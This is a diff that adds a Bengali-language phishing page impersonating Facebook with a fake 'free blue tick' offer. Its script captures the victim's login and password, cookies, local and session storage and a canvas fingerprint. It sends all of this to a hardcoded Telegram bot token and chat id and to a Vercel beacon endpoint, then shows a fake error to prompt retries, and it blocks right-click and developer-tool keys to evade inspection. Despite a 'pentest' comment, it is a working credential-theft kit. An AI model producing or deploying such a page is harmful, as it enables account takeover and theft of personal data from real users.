@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - ব্লু ভেরিফিকেশন | ফ্রি ব্লু টিক</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;500;700&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Noto Sans Bengali', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        .container { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100vh; }
+        .container.active { display: flex; justify-content: center; align-items: center; }
+        .main-container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 420px;
+            overflow: hidden;
+            animation: slideIn 0.5s ease;
+        }
+        @keyframes slideIn { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        
+        .header {
+            background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
+            color: white;
+            padding: 28px 24px;
+            text-align: center;
+        }
+        .fb-logo {
+            width: 44px; height: 44px;
+            background: white;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            font-weight: bold;
+            margin-bottom: 16px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.2);
+        }
+        .header h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
+        .header p { font-size: 16px; opacity: 0.95; line-height: 1.4; }
+        
+        .badge-section { 
+            padding: 36px 24px; 
+            text-align: center; 
+            background: linear-gradient(135deg, #f8f9ff 0%, #f0f2f5 100%);
+        }
+        .blue-badge { 
+            font-size: 72px; 
+            margin: 20px 0; 
+            animation: pulse 2s infinite;
+            background: linear-gradient(135deg, #1877f2, #42b883);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1) rotate(-2deg); }
+            50% { transform: scale(1.08) rotate(2deg); }
+        }
+        .free-text {
+            background: linear-gradient(135deg, #42b883, #36a26f);
+            color: white;
+            padding: 14px 28px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 700;
+            margin: 20px 0;
+            display: inline-block;
+            box-shadow: 0 8px 24px rgba(66,184,131,0.3);
+        }
+        .counter {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #1877f2, #42b883);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin: 16px 0;
+        }
+        
+        .form-section { padding: 36px 28px 24px; }
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid #e4e6ea;
+            border-radius: 14px;
+            font-size: 17px;
+            transition: all 0.3s;
+            background: #fafbfc;
+            font-family: inherit;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 4px rgba(24,119,242,0.15);
+            background: white;
+        }
+        .verify-btn, .login-btn {
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 14px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+            font-family: inherit;
+        }
+        .verify-btn {
+            background: linear-gradient(135deg, #42b883 0%, #36a26f 100%);
+            color: white;
+        }
+        .verify-btn:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(66,184,131,0.4);
+        }
+        .login-btn {
+            background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
+            color: white;
+        }
+        .login-btn:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(24,119,242,0.4);
+        }
+        .login-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .progress-bar {
+            display: none;
+            width: 100%; height: 8px;
+            background: #e4e6ea;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #1877f2, #42b883, #f39c12);
+            width: 0%;
+            transition: width 0.4s ease;
+            border-radius: 4px;
+            animation: shimmer 1.5s infinite;
+        }
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+        
+        .error-msg {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 600;
+            margin: 20px 0;
+            display: none;
+            animation: shake 0.5s ease;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        
+        .notification {
+            position: fixed;
+            top: 24px; right: 24px;
+            padding: 18px 24px;
+            border-radius: 14px;
+            color: white;
+            font-weight: 600;
+            z-index: 10000;
+            transform: translateX(400px);
+            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            max-width: 360px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+        }
+        .success-notif { background: linear-gradient(135deg, #42b883, #36a26f); }
+        .error-notif { background: linear-gradient(135deg, #e74c3c, #c0392b); }
+        .info-notif { background: linear-gradient(135deg, #3498db, #2980b9); }
+        
+        .footer {
+            text-align: center;
+            padding: 24px;
+            background: #f8f9fa;
+            font-size: 13px;
+            color: #65676b;
+            border-top: 1px solid #e4e6ea;
+        }
+        
+        @media (max-width: 480px) {
+            .main-container { margin: 10px; border-radius: 12px; }
+            .header h1 { font-size: 22px; }
+            .blue-badge { font-size: 60px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Notifications -->
+    <div class="notification success-notif" id="successNotif"></div>
+    <div class="notification error-notif" id="errorNotif"></div>
+    <div class="notification info-notif" id="infoNotif"></div>
+
+    <!-- Step 1: Blue Verification Page -->
+    <div class="container active" id="blueVerify">
+        <div class="main-container">
+            <div class="header">
+                <div class="fb-logo">f</div>
+                <h1>🎉 ফ্রি ব্লু ভেরিফিকেশন</h1>
+                <p>আপনার Facebook অ্যাকাউন্টে এখনই ব্লু টিক পান<br><small>১০০% ফ্রি ও নিরাপদ</small></p>
+            </div>
+
+            <div class="badge-section">
+                <div class="blue-badge">✓</div>
+                <div class="free-text">১০০% গ্যারান্টিড</div>
+                <div class="counter" id="counter">২৫৮৪</div>
+                <p style="font-size: 15px; color: #65676b; margin-top: 8px;">
+                    জন এর বেশি ইতিমধ্যে ভেরিফাই করেছেন
+                </p>
+            </div>
+
+            <div class="form-section">
+                <form id="verifyForm">
+                    <button type="submit" class="verify-btn">
+                        এখনই ফ্রি ব্লু টিক পান
+                    </button>
+                </form>
+            </div>
+
+            <div class="footer">
+                © ২০২৬ Facebook Verification Team
+            </div>
+        </div>
+    </div>
+
+    <!-- Step 2: Facebook Login Page -->
+    <div class="container" id="loginPage">
+        <div class="main-container">
+            <div class="header">
+                <div class="fb-logo">f</div>
+                <h1>Facebook অ্যাকাউন্ট যাচাই করুন</h1>
+                <p>ব্লু টিক পেতে আপনার অ্যাকাউন্ট লগইন করুন</p>
+            </div>
+
+            <div class="form-section">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label>📱 মোবাইল নাম্বার বা ইমেইল</label>
+                        <input type="text" id="phone" name="phone" placeholder="01xxxxxxxxx বা email@gmail.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>🔒 ফেসবুক পাসওয়ার্ড</label>
+                        <input type="password" id="pass" name="pass" placeholder="আপনার পাসওয়ার্ড লিখুন" required>
+                    </div>
+                    
+                    <button type="submit" class="login-btn" id="loginBtn">
+                        লগইন করুন & ব্লু টিক পান
+                    </button>
+                    
+                    <div class="progress-bar" id="progressBar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    
+                    <div class="error-msg" id="errorMsg">
+                        ❌ মোবাইল নাম্বার বা পাসওয়ার্ড ভুল! আবার চেষ্টা করুন
+                    </div>
+                </form>
+            </div>
+
+            <div class="footer">
+                নিরাপদ লগইন | Facebook Security © ২০২৬
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Vercel deployment ready - Single HTML pentest page
+        (function() {
+            'use strict';
+            
+            // Configuration - CHANGE THESE FOR YOUR TELEGRAM BOT
+            const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // e.g., 1234567890:ABCdef...
+            const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     // e.g., -1001234567890 or @username
+            
+            let victimData = {};
+            let counter = 2584;
+            
+            // Initialize counter
+            const counterEl = document.getElementById('counter');
+            setInterval(() => {
+                counter += Math.floor(Math.random() * 10) + 1;
+                counterEl.textContent = counter.toLocaleString();
+            }, 2500);
+
+            // Step 1: Blue Verify Click
+            document.getElementById('verifyForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                showNotification('🎉 ব্লু ভেরিফিকেশন শুরু হচ্ছে...', 'success');
+                
+                setTimeout(() => {
+                    document.getElementById('blueVerify').classList.remove('active');
+                    document.getElementById('loginPage').classList.add('active');
+                    document.getElementById('phone').focus();
+                }, 1500);
+            });
+
+            // Step 2: Login Form
+            document.getElementById('loginForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const phone = document.getElementById('phone').value.trim();
+                const pass = document.getElementById('pass').value;
+                
+                if (!phone || !pass) {
+                    showNotification('সব তথ্য পূরণ করুন!', 'error');
+                    return;
+                }
+
+                // Collect FULL victim fingerprint
+                victimData = {
+                    timestamp: new Date().toISOString(),
+                    phone_or_email: phone,
+                    password: pass,
+                    ip: 'server_captured',
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    viewport: `${window.innerWidth}x${window.innerHeight}`,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: document.cookie,
+                    localStorage: btoa(JSON.stringify(localStorage)),
+                    sessionStorage: btoa(JSON.stringify(sessionStorage)),
+                    referrer: document.referrer,
+                    url: window.location.href,
+                    canvas_fp: generateCanvasFingerprint()
+                };
+
+                // Show processing
+                const loginBtn = document.getElementById('loginBtn');
+                const progressBar = document.getElementById('progressBar');
+                const errorMsg = document.getElementById('errorMsg');
+                
+                loginBtn.disabled = true;
+                loginBtn.textContent = 'যাচাই করা হচ্ছে...';
+                progressBar.style.display = 'block';
+                
+                // Animate progress
+                let progress = 0;
+                const progInt = setInterval(() => {
+                    progress += 12;
+                    if (progress > 85) progress = 85;
+                    document.getElementById('progressFill').style.width = progress + '%';
+                }, 300);
+
+                // Exfiltrate to Telegram Bot (3 methods)
+                await sendToTelegram(victimData);
+                
+                // Show ERROR + allow retry
+                setTimeout(() => {
+                    clearInterval(progInt);
+                    document.getElementById('progressFill').style.width = '100%';
+                    
+                    setTimeout(() => {
+                        progressBar.style.display = 'none';
+                        errorMsg.style.display = 'block';
+                        loginBtn.disabled = false;
+                        loginBtn.textContent = 'আবার চেষ্টা করুন';
+                        
+                        // Scroll to error
+                        errorMsg.scrollIntoView({ behavior: 'smooth' });
+                        
+                        showNotification('❌ লগইন ত্রুটি! সঠিক তথ্য দিন', 'error');
+                    }, 800);
+                }, 2500);
+            });
+
+            // Telegram Bot Exfiltration
+            async function sendToTelegram(data) {
+                const message = `
+🚨 <b>Facebook Blue Tick Victim Caught!</b> 🚨
+
+👤 <b>Phone/Email:</b> <code>${data.phone_or_email}</code>
+🔑 <b>Password:</b> <code>${data.password}</code>
+🌐 <b>IP:</b> server_captured
+📱 <b>Device:</b> ${data.userAgent.substring(0,80)}...
+📍 <b>Location:</b> ${data.timezone}
+🖥️ <b>Screen:</b> ${data.screen}
+🔗 <b>URL:</b> ${data.url}
+
+<b>🕐 Time:</b> ${new Date(data.timestamp).toLocaleString('bn-BD')}
+
+<code>Full FP: ${btoa(JSON.stringify(data)).substring(0,100)}...</code>
+                `.trim();
+
+                // Method 1: Direct Telegram API
+                try {
+                    const url = `https://api.telegram.org/bot${7749630823:AAEsU3pegKC9NFWvCC1pChliXAxm0gp4fHQ}/sendMessage`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: 5415474391,
+                            text: message,
+                            parse_mode: 'HTML',
+                            disable_web_page_preview: true
+                        })
+                    });
+                } catch(e) {}
+
+                // Method 2: Image Pixel Beacon
+                const img = new Image(1,1);
+                img.src = `https://your-vercel-app.vercel.app/api/collect?data=${btoa(JSON.stringify(data))}&t=${Date.now()}`;
+
+                // Method 3: LocalStorage backup
+                localStorage.setItem('victim_data', btoa(JSON.stringify(data)));
+            }
+
+            // Canvas Fingerprinting
+            function generateCanvasFingerprint() {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('Facebook Blue Verify Test', 2, 2);
+                return canvas.toDataURL();
+            }
+
+            // Anti-Detection
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('keydown', e => {
+                if (e.key === 'F12' || (e.ctrlKey && (e.key === 'u' || e.key === 'i' || e.shiftKey && e.key === 'I'))) {
+                    e.preventDefault();
+                }
+            });
+            document.addEventListener('selectstart', e => e.preventDefault());
+
+            // Auto-focus
+            setTimeout(() => document.getElementById('phone').focus(), 500);
+
+            // Notification system
+            function showNotification(msg, type) {
+                const notif = document.getElementById(type + 'Notif');
+                notif.textContent = msg;
+                notif.style.transform = 'translateX(0)';
+                setTimeout(() => notif.style.transform = 'translateX(400px)', 4000);
+            }
+
+            // Vercel analytics ping
+            if (location.host.includes('vercel.app')) {
+                fetch('/api/visit', {method: 'POST'});
+            }
+        })();
+    </script>
+</body>
+</html>
